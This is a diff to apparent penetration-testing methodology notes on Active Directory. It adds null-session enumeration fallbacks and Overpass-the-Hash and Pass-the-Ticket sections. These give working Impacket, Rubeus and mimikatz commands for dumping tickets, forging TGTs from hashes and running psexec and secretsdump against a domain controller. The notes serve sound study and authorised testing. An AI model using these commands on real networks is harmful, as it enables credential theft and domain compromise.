@@ -43,6 +43,8 @@ Enumeration" subsection under "RPC, NFS, and LDAP Enumeration" — for the manua
 [`notes/ad-delegation-trust-bloodhound.md`](ad-delegation-trust-bloodhound.md) §1 ("BloodHound CE —
 Attack Path Enumeration") for collector flags and the CE ingest workflow.
 
+> **Fallback:** if LDAP queries fail (firewalled, channel binding), fall back to SAMR/LSARPC-based enumeration: `rpcclient -U '' -N <DC_IP>` (null session), `lookupsid.py`/`samrdump.py` (Impacket), or `nxc smb <DC_IP> --rid-brute` — these use a different protocol path (port 445 SMB/RPC, not 389 LDAP) and often work when LDAP is restricted.
+
 ---
 
 ## 2. If You're Starting Fully Unauthenticated Instead
@@ -159,6 +161,41 @@ interactive session (not just command execution) on the next machine in the chai
 captured per Stage 14 before you move on. See
 [`notes/windows-lateral-movement-persistence.md`](windows-lateral-movement-persistence.md) Part 1 for
 the DCOM/WMI/schtasks/PsExec/WinRM technique comparison and exact syntax for each.
+
+### Overpass-the-Hash / Pass-the-Key
+Use an NTLM hash or AES key to request a Kerberos TGT (distinct from Pass-the-Hash which uses NTLM auth directly). Useful when NTLM is disabled/monitored but Kerberos is accepted.
+```bash
+# Impacket — get a TGT using the NT hash, then use Kerberos auth for all tools
+getTGT.py -hashes :NTHASH domain.local/user
+export KRB5CCNAME=user.ccache
+psexec.py -k -no-pass domain.local/user@target.domain.local
+
+# Rubeus (Windows)
+Rubeus.exe asktgt /user:Administrator /rc4:<NTHASH> /ptt
+
+# mimikatz
+sekurlsa::pth /user:Administrator /domain:domain.local /ntlm:<NTHASH> /run:powershell.exe
+```
+
+### Pass-the-Ticket (PtT)
+Use a stolen Kerberos ticket (TGT or TGS) to authenticate as another user without knowing their password or hash.
+```bash
+# 1. Export tickets from memory (Windows — Rubeus or mimikatz)
+Rubeus.exe dump /nowrap
+# or:
+mimikatz # sekurlsa::tickets /export
+
+# 2. Convert .kirbi (Windows format) to .ccache (Linux/Impacket format)
+ticketConverter.py ticket.kirbi ticket.ccache
+
+# 3. Use the ticket with Impacket tools
+export KRB5CCNAME=ticket.ccache
+psexec.py -k -no-pass domain.local/admin@dc01.domain.local
+secretsdump.py -k -no-pass domain.local/admin@dc01.domain.local
+
+# Rubeus direct injection (Windows — no export/convert needed)
+Rubeus.exe ptt /ticket:<base64-or-file>
+```
 
 ---
 
